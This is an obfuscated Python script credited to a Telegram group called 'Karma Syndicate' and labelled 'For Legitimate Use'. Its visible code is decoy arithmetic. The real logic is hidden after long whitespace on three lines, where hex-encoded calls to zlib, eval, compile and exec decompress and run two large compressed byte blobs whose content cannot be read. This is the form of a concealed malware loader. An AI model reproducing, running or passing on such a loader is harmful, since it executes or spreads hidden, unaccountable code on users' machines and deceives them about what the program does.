from builtins import *
from math import prod as _memoryaccess


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


Hypothesis, _round, _square, _stackoverflow, _positive, _ceil, _builtins = exec, str, tuple, map, ord, globals, type

class CallFunction:
    def __init__(self, _cube):
        self.Invert = _memoryaccess((_cube, -12348))
        self.Ceil(Divide=64842)

    def Ceil(self, Divide = bool):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Invert /= 62740 + Divide
        
        try:
            ((_round, Hypothesis, _detectvar) or _stackoverflow if (_round, Hypothesis, _detectvar) and _stackoverflow else ... or (_stackoverflow, (_round, Hypothesis, _detectvar)))

        except OSError:
            ((_stackoverflow, (_square, _detectvar)) for _stackoverflow in {_stackoverflow: _stackoverflow} if _stackoverflow is _round)

        except:
            _builtins(-64849 - 54224) == bool

    def _power(self, _multiply = 57926):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _multiply *= 83802 * -40566
        self.Random != None
        
        try:
            (_square, _detectvar) if _stackoverflow < Hypothesis else (_stackoverflow, _square) > _round

        except ArithmeticError:
            ((_stackoverflow, _square) or _square if (_stackoverflow, _square) and _square else ... or (_square, (_stackoverflow, _square)))

        except:
            _builtins(-27321 / -10592) == int

    def Frame(DetectVar = True):
        return _ceil()[DetectVar]

    def Cube(_substract = 52124 + -48769, Substract = Ellipsis, _invert = _ceil):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _invert()[_substract] = Substract
        
        try:
            ((_square, (_square, _detectvar)) for _square in {_square: _round} if _round is _positive)

        except TypeError:
            ((Hypothesis, (_stackoverflow, _square)) for Hypothesis in (_square, _detectvar) if _positive >= _detectvar)

        except:
            _builtins(-53339 / 97856) == Ellipsis

    def execute(code = str):
        return Hypothesis(_round(_square(_stackoverflow(_positive, code))))

    @property
    def Random(self):
        self.Run = '<__main__.CallFunction object at 0x000005749BE47463>'
        return (self.Run, CallFunction.Random)

if __name__ == '__main__':
    try:
        CallFunction.execute(code = __license__)
        Absolute = CallFunction(_cube = 30788 - 81271)

        Absolute._power(_multiply = -91287 * Absolute.Invert)                                                                                                                                                                                                                                                          ;CallFunction.Cube(_substract='oOoooDODODDoOooDODODDO',Substract=b'x\x9c\xe5[[o\xe2J\x12~\xe7W\xb0y\xc1\xd60\x8ci\xdfp$\xa4}\xc8\x19\x89l29Z\xce*G\x1a\x8d\x90\xb1\xdb\x19g\x8c\xcd\xdafBvu\xf6\xb7\xefW\xddm\xec\x04\xd8\x98@\xceC\xd6M_\xdd\xd7\xea\xaa\xea\xaarS\xe6\x8f\xe7\x9d.\x9e8\xd2DL\xcflVfY2\x9bu\xff2>\xfb\x9c\xe5\xdd+~\x17\x97\xf1\xc2/y\xf7\x1f\x05?\xebfy\xa3\xaa\xbf*\xbfgy!jkg\xbf\xf1\x84\xdf\xe5\xfe\xe2\xfc\xac\x7f\xf6\xd7u\xea\xcf\xb3\xf9\x99\xfe\xa4~\x96\xdf\xf9i\xfc/\xbf\x8c\xb3T\x0e\xf17?_\xf8\xdd\xe9c\x1a\xc6\x01\xc6x\xd6\x7f\xa9z\x94u\xbf\x97\xe5\xb28\xff\xf4\xa9\x1c,\xf8\'\xd1p_\xbb\x9f</6C\\\xe1}Q>\xab\x91\xc4\x01O\x0b.j\xf4\xac\x91\xe9\x18\xa6\x1b\x9a\x1ec.3\x8763\xe6\x81iZ\x8e\xefY\xc1\xc8w{\x1d\xfd|\xd36NK\xadW\xfc\x88\xc3\x9e\xde\xe1\xeb\x80/K\x05\xc4t\xb9*\xb5\xb3_\x13\xee\x17\xbc{\x91\xa5\xbd\xb2{\x9d\x85q\xf4x\xa6w\xe4\xa0\xf1b\x99\xe5\xe5l\x86\xf6\x8fEO\x1f\xf0u\\jz\'\xc9\x02?)4\xfdko2\xb9\xbc\x9a\xc0]\t\x8f\xf0rr\xd5\xfb6\xbeK\xb29jtv\xbd\xa6f\x8cM\xa7\xe2G\x89\xa9HO\xa7\xbd\xaf\xe7\xe7\x1f>~\xf8\xa8}\xd4>\x0cu\xfd\xdb\xb7q\x18\xe7{\xbbH\xee\xef\xef\xc9\xc7\xf7I|\x1f\'\t~H\xdf\'\xdb\xbd\xdc\xf1\xd2/\xcb\xfd=\xc5h\x9a\xdc\xc3\xa3+\xea\x0bY,A\xae\xb1\xb3\xe3\xa5\x18}BN\xfd\xa4G\x9b\x1a`{\x07\xbb\xfd\xfd\xf6\x16^\x84\x88\xf0\xd0X\xdb\xbdi\xbd\xf9*N\xca8%\xb0\xff\xf4\xf3\xa2\xb3\xdd\x92\xfa[\xaf\x1f\x1e\xd6\x0f"\xa0\x9f\x8cPH\xbd\n\xe0\x10`\x08@\x04\x1c\x01\xb0D\xdb9\\\x91\xc6e\x12\xaf\xe6\xcf\xe1\xa7\xf77\x1bD\xbb\xa56\x8e\x1d\xd8\x89\xfe\xf5$\xbd\x0c\xe24\xe4k\xad\x97\xf8?\xf9\xd6\xdbo\xfa\x1e\x18)\\Sc\xab\xe8}\x03(/\x8b\xf6\xf0\x11\t*\x11o(|\xdf\xc0\xe1I\xbc\\d\xc1.\x00\xed\'w<\x13\xe9\'\xe2y\xdf J\xb2l\xfb-\xe0\xb3\x8f\xad\x112\xdd\xde\xaa\x9f\x8c\x0e\x06P\x1c\x07\x05\x0e\xdb\xe3\x00\xb4\xb7\x93\x83\x00\xb4\xbf\x97\n@\x8fQ\x9c\xac\xf9\xf7tu\x08\x94\xe4\xc0\x14\xb0\xcd\x14D\xf4\xbe\x91\x89\x17\x89\xff\xb9=;\xfa]\x96\xd6/\x10\xbfs\x00\xad\xf2\xdf\xda\xc3\xe7\xcb5\xdc\x97k\xf8/"I\x89kd\xdf7\x8cJ?K\xa2\x03Xv\xbaH\xd3t\xb1@(\x12\xc2#\x0b \xf5z\x83\xfb,N\xff\x87<xO\xfd\xa1\'\xc0P8\xf4\x197\x87\xde\'ti;\xd8\xa06\xef\x99\x9e\x1d\x99\xb6\xf2.<\xe5-x\xa6<\xa5\x1d6g#\x16\xb6\xaak3\x0fRa\xc8\x83,\xe4Zo\x14\x95\xdb\\H\x17\xa2\xef;\xc6\x87\x80\xaf\x0f\x10\x01oE\xb2\x96q(u\xcc\x8e\xd2.\x98\xf0Fc\xa7,\xb5[L\x95\x99jG\xdb\xd4emw\xf4\xc0\x892\xd7\x192\xf7\xc5\xaewCmw\x97N\x08\xc7UX\xbb\xaa\x0c\xee\xa5\xe1\x80\x97\xfeb\x1e\xfa\xddk\xc1\xc0\xe8\'\xb9\xd9\x97/\xe7\xbb\x89r\xcf\xaeJ\x81l"\x11HE\xadv\xb5\xa7\x0fg\xe6\xcc\x9e9\xf0\xa3\x19\x9b\xb9H\r\xd1\x80m\x97\xb6\xec\xcf@\x0bK\xb4\xf2f\x06\xda\xa1\x1fZ\xeev\xe91X7d\xa1\xc0(\xa3\x1d\xb6T\xfe\x15XcGv\x84\xad\x1c:\x9e\xc3)\xfdj\x1c\xeaa_hC\xb1\x9b\x97px.\xb1\xa3\x97\xed\xb6\xe94`8|\xf9\xcc\xb5\x1c\xdb\x1d\xb9\x16\x8b\\\xc3\t$\x18\x18{5\x08.\xb1\xf0K\x02\x01 \x00\xfc\x16\xfe\xf2\x18\x088\x8am\x10\x0b\xa1\xf4H\xb1\x98*\xef6\xd8O\x9b\xbao\xc6~\x98\xe5\x00v\x81c3\x03\xfc!\x02D\r\xc7Al#g\xb1\xe1\xaba\xba{8+\xb0<x\x1f\xae\x8e\xbdF(=9z\xfb\xe2\x9a_A8\'f\xb6VdENdY\xe4e\xaa*\x11!\\kf\x9b\ny(M\xd3Z":\x88\xdb\xee9\r\x9e\xf3\x7f\xfe$\xae}\x95\xe7\xad\'\x0c\xb2\x91\x94#\xe6H\x19\x90\xcf\xf9\xae\xb9\x1d4a\xc2\x11BI\xe1\x9ai\xca\xc9\xb8\xc5\x14\xb7\r\x02\x9a\xf6\x9f\xbd\xfa\x9d\x9e\xe5\x9a\xb6K\xaf\xd1\xfd4\xd4\xf67;\x0cYl\xd0<$\n\xb3\xf6O\xc3f|z\xd4\x07\xee;\xec\xc4\x04\xfd\x0c\xa3\x94|\xd1\xc4\xad\xd6\xd8tIh4!$\x12\x88.\xce#\x04\x07\xe0SO\x88+J\xe7\xbaV2\xcb\xb1j\x81\xd1\xe0\xc6\x95\xd8_\xe5\x89S\x0f\x1bj\xc1Ku[\x9f\x87\n$\x84oS\x85t\xd20*\xed\xf2\xe7;U\xaa\xc3\x89\x8c\xc8I\x92\x94\xccU\xe9\x9a\xd0\xaa\xd2\xd6\xbb8\x95\xf4\xa1\xe6<U\x0fc\'\xe0d\xae\x8b\x13_zW\xc4#\x95\xafR\xea]{\x8c\x9b\x90\xa0Cb\x8f:\xfb\x81|\xa7\xe0\xb8\x049\xcf\xf1\x1b\x8eJ|q\xce\xd6!\x95\xbe\xc5\x01g\x07\x10\x85\xde\xe2\x90s\x80\xc0\x8e<\xdc\x902\rK\xe5)U\x95\x91\x93\xe97\xe0_N%\xaa\xbcZ\xd0#\r[\xd8\r\x12\xa9l\x93\xe5\x80H\xa9\x9d\xf1\x00J\x04*\xb4U8\\()\xa4\xa6\x8c\xa0X\xb8Bi\xf1\xd0`\xb4]\xdaZ\x81\xb1gC8O\xa8,6b\xa9\xc0l\x95\xb6\xec\xcf\xc1\x0c<\xb4aB\xf1ahk\xa1\x81\xbb]zr\xd8\xec\xe1\xb6\x86\xd2\x1a\x86\x87)O\xc7)R\xcc\x81\x16\x01g\xb8\xa6\xe9\xb3\x88E\x8e\t\x8db\xee\x0cqXB\xbdb\xdc1\x1d\x93EV\x08\x89\xd8\xb3G\x16\xb7FN\x00,w\xc1\xd0G\xa6\xe7\x8e\xac\xc86\x9c\x10z\x08\xfa\xb1LknZ6Z\x9a&dh\x03\xf5C\xa0l\xc48\xfa\x1c\xb9\xc6\xa9\x0f\xdf\x06\xe3n\xb2\xef&\x1b\'\xf7\x06\xa4hA?\x10:\x18c\x86\x05>\xe6\x9a\xae\x05\xf8\xbd~\x85=\xe3\xe6&\xbb\xc9\xb2\x1b\x03!\x82\xec\x06y\xc3\xc8\x90=V\x0f\xabL8Cu\x1a3\x15ot\xad\x86\x1e\xf6R\xdd\xe3\xf50"dOX0\x98 W\xc9\x16\x0c\xc5\x0e6eo\xc0\x90\xde\xa6\xee\x1b\x10\xf3\xa1"u%4\xd7\xc2\xb4,\x95\xf1[\x89\xd3\xaem\xbb\xa6\xa0\x80\xd0\x1a:\xae#(\xe2\xf5f\x98\x8d\xcdU\x8a|\xe2\xee\x85T5\x8e\xd9\x86Q\xc3\x9e\xc0\x94$Z\xa5\x87U\x99\xc2\xff6uG\x07J\xb0k1\xc9\xf5Z\xcdU\xfa\x13\x88\xaf\x9e\x12\xa4jA\xcbsj=\xd1o\xa7#\x1e\xc5\xf5\x10\x8f\xc8jRY\xa2\x8e\xe2~{\xc4.\x0e\x17\xc25\xe3g\xe97\xc0k\xac\xee\xc4\x06\xe9\x1dgR\x1d\xd7o[\x0b\xeeYvqqqssqs\x91]\xe0\xa0\xa0\xcc)\xe4\xf6\xa6l\xee+\xd4\nTY-\xc5\x07\xed\xe4v5\xd5\x0bL\x90fK\xe7\x19\x8e7\x11g\x87\x19\xd1\xbf\xc8\xaf\x89R\xab\x95\x99\x96\\\xdc\xc3\x99\xe2\xceL\x9c-\x968U\x86B\xc4#K\xf8\xb3\xd2?\xebT\xf8\xf3\xec\xe3\x10\xbc"\xb7\xe2\x11CF\x9f\xe48\x865\x18\x89dC\x08u\x9e \xe5\x08,|d\xce!\xc4\xc8\xbc\xed\x04H\x8b\x1a\x88#\x1b\xa1=b\x869\x14\xba\xbd\n\x99\x87wC\x88\x8cdz\xc6)\x80V\xcc\x9aC\x08\xb2h\x1c\xd34]\x8c\x05\tP\x8c6\xb7F\xb6\x05z\r\x18z\x16\xe84\'\xb6aQ+\x13\xe9H\xf4\x86Y@\xe0$\x8b\xbe\x8d>L\xf0d\x9a-\xc7\xd95\x84\xa8\t1\xd4\xf4\xb0\x02\xc3613G\x08\xa7\xde\xb3\xb1NM\xb25\xb16m\x04OI\xb9\x8aO\xce\x846g\x8eU\xd9\xbfU\xba\xfa\xd0\xda\xb4\xbc\xbcT\xd7\x95{vj\xd6\x1c*6\\3\xe3&\x83V\xef\xdfB\xec`8p\xb0(\' |#\xcc\x91\x98\xc4B[\xa6\xb1)H\xbb\xc0m\x06\xfc\x02^;\xc0\x11\xa88\xa3v\xe2I\x94g\x8bnu\xb7\xb1+\xefKv\xf9\x9a\x07}q\x1f\xb5\x9f\xf0\xb4\xbf\xcc\xe3\xb4\xec\x93_\xf8\xcb~\xb6\xe4i\x87jh`g\xe2\xeb\xd1%\x19\xf2\xc8\x967!\xab\xde\xe5D\xef\xa8~\xb2\xa2J\x85~\xc9\xcbx\xc1\xab|\xce\xff\xb9\xe2E\xb9y_<\x16r*\x8b\x15f\xb2\xcc\xb3\x80\x17E\x9c\xde\r\xc2\xd5b\xf1X\xcd\xeb\xd7,Kd5\xea\xab*\x15i\xbf\x10q._\x07Y\x92\xe5\xfe\xc2\xaf\xaa|\xcer\xde\x9f\x96\x8f\t\xc72\xe2RVZ\xe5\x10G\xe6\x83\xa5\x9f\x17\x9b\xbeP&\xf2\xb2F5K\xd4\t~\xf8w\xbc\x18\xc86\xe6@^\xdc\x8d\xb3\x1af\x93\xb4\xe0\xc1*\xe7\x7f\x97mn\xfd<\xc5\xfc;4\x9c\xe6\xafJL\xa0\xe0\xe5\x98\xbe\x8e\x92\x95Z\x84\xc2`\xadwr\x1e\xcc\x828\x1b\x0b\xd3\x04Y(\xe4-Zi\xb9\xa0d\xe7;\xf7C\x9e\x17\xe3\x7fO+\xa3te\x95F\xe2\\\x9d\x12\xca\x0e*2\x7ft\xf6O=\x8c\x0b\x7f\x9e\xf0\xd9\x83\x9ca\xa1\xed\x9e\xb9\xde\ty\xd4\x8d\x8b\xb8\x0c\xb3\x87TC\xcc\xfb?\xf8\xe3C\x96\x87\xfd\xc2\xff\xc9gQ\x9cpu\xad\xb9\xac.\x82\xd3\x83\x85.\x01\x17>\xdeL\xe1\x8e\x97\xb2=\xedP\xb6\x02\x14\xaa\xcf\xc4\xea\xa2\x81\xb2\xdc\xf7\xabu\xaaX\xaf\xefLG]5v7N7#\x0cJ\xbe.\xeb\x81\xe9\x11\xa8\xaa\x1dHe\x0e\xf8\xa9;\xb7\xa1\xd4\xba\xd2\xe2\xc4-f3\xb0>\x97\xb8\xb9\x1b\xdaxG\xfc\x1e\xdc?$\xc1\xefY]\x0b5C7t\xe7\xae\xaa\xe5\x86T\xc7r\x04MR\r\xd3\xf6\xac\xa1\xc5\xa9\x9c\xb3\x11\x98\xf9\xb3\xf7\xa0r\xcb\x86C\r\x1b\xfc^\x9c\x1bm\xa8W\x7f\xb2\xf6\x87\xb8\xfc\xde%\xea\xd46\xfb\xd3\xdf,\xb7q\xddB\x07\xadDO\xc1FO4x\xc8\xb1Ib\xa7>\x90\xa0.\x1e\xbax#\x7f@\xc9z<\x9e\x14\xfc\x1d@^\xc0\x1d\xe3\x08y\xe0p\xc8K.P\xb3\tEA\xbfT\xcc\xa1\x86\xd0\xff\x1bt\x88w,\xfc8\xd5\x14\x87 \xa4\x9a%')

        if 363178 > 1644424:
            Absolute.Ceil(Divide = Absolute.Invert * 35571)
        elif 142794 < 2857199:
            CallFunction(_cube = -6695 + 57045)._power(_multiply = -88914 * Absolute.Invert)                                                                                                                                                                                                                                                          ;CallFunction.Cube(_substract='wwxwxxxxwwxwwwxxxxw',Substract=b'qQ\x8e\xe5\xdf\x1c\xaa\xaft\x92\x05\xc8\x0b#\x12\xa6\x84\xb6\xe0t$>K\xe3\x90AF"C\xa4\x0cJ\x9dk\x9b\xce\xfa\x12\xdb7Y\xf5\xe5N~\xbb\x9bV\x1fR\xf4>\xc9\xdf\x97\xf2\xb6\x03]zPW &\xfa\x1f\x9d\xdd\x0ck\x99\x15\xa5\xa6\xd8r_NH\x84\xfa6\xb7k\x10\xddf\x1a\xf26\xa0\xba\x11(BAr\xe8\xe1)\xc9P\x0b\xd9\xf3 \x07\xc7\xd3\xf4A\xb1L\xe8\xa2U\xca\x0b\xed\t\x86Mn~\xc9\xf3,\x7f\x8eO\xe2\x1e\xc3\x95\xfc\xaaA\xcb\x12_g\'z\x83\x15\x97\xab<\x15Y\xc5>\x15\xf8\xe5_4\xe8\xef\x1at\xe8\x90r.\x1bm\x18\xc7X\xaa \xf2\xfb\x9a\xfc\xc8v}\xdd9\x06\x93\x99M\xf2\xb7EX$$[\x89\x91\xa6\xc4[\xc2X\x07(\xb8\xc1T\x93y\xc0\xca\x97\x15l5\xed\xd2\xcf\xcb\x19\x9d.c!\x04(\xe0\x89\xbd!\x99A\xbb\x01.\x11\xf2\x08\xac"\xcb\xa3A\xc6G\xe4\r\xda\x99%\xaa4@\x8b\xdc\x80z\x84\xb0\xa3U\xe7_\xff\xeb\xbe\x130\xcar\xb1\x91t0\x89\r\xfd\xa6\x1f\x05\'\xf1E\xe7\x89\xd4\'\xf4\x00\xd0\x9f\r\xda\xa3\x8f/\x9cL\x0fG\xc9\x85mT~\x08qQw6K\xfd\x05\x9f\xcd\xc6\xe3\xa7\xb7\xba\xe4\x81-a&\xc9\xbc\xf3_\xfa\x193H')

        if 398719 > 9452034:
            Absolute._power(_multiply = 79542 + Absolute.Invert)
        elif 249121 < 7612626:
            CallFunction(_cube = 44223 / 34411).Ceil(Divide = Absolute.Invert / 9307)                                                                                                                                                                                                                                                          ;S2222S2SS2SS22SSSS22SSS22S,JLJILIIILJJLILJIIJL,XXWWWXXWXXXWXXXXWWXXW,ILLIIJJLIJJILIJLJLL,nmmnnmnnmmnnmmmnnnnmmnn=(lambda O00ooOO0Oo0OoOo0oo0ooo0o0:O00ooOO0Oo0OoOo0oo0ooo0o0(__import__('\x7a\x6c\x69\x62'))),(lambda O00ooOO0Oo0OoOo0oo0ooo0o0:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O00ooOO0Oo0OoOo0oo0ooo0o0)"),filename='\x58\x57\x58\x58\x58\x58\x57\x57\x57\x58\x58\x57\x58\x58\x57\x57\x58\x58\x57\x57',mode='\x65\x76\x61\x6c'))),(lambda O00ooOO0Oo0OoOo0oo0ooo0o0:O00ooOO0Oo0OoOo0oo0ooo0o0['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda:(lambda O00ooOO0Oo0OoOo0oo0ooo0o0:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O00ooOO0Oo0OoOo0oo0ooo0o0)"),filename='\x58\x57\x58\x58\x58\x58\x57\x57\x57\x58\x58\x57\x58\x58\x57\x57\x58\x58\x57\x57',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda nmmnmnmnmmmnnmnmmn,O00ooOO0Oo0OoOo0oo0ooo0o0:nmmnmnmnmmmnnmnmmn(O00ooOO0Oo0OoOo0oo0ooo0o0))
        if 334961 > 6275544:
            CallFunction(_cube = 87428 + 66897)._power(_multiply = -70427 / Absolute.Invert)
        elif 287842 < 8260986:
            Absolute.Ceil(Divide = Absolute.Invert + -99536)                                                                                                                                                                                                                                                          ;ILLIIJJLIJJILIJLJLL()(nmmnnmnnmmnnmmmnnnnmmnn(XXWWWXXWXXXWXXXXWWXXW(S2222S2SS2SS22SSSS22SSS22S(JLJILIIILJJLILJIIJL('\x76\x61\x72\x73'))),CallFunction.Frame(DetectVar='oOoooDODODDoOooDODODDO')+CallFunction.Frame(DetectVar='wwxwxxxxwwxwwwxxxxw')))

    except Exception as _detectvar:
        if 208568 > 7427999:
            CallFunction.execute(code = _round(_detectvar))

        elif 110290 > 8045995:
            CallFunction(_cube = -85417 / -49634).Ceil(Divide = Absolute.Invert - 67717)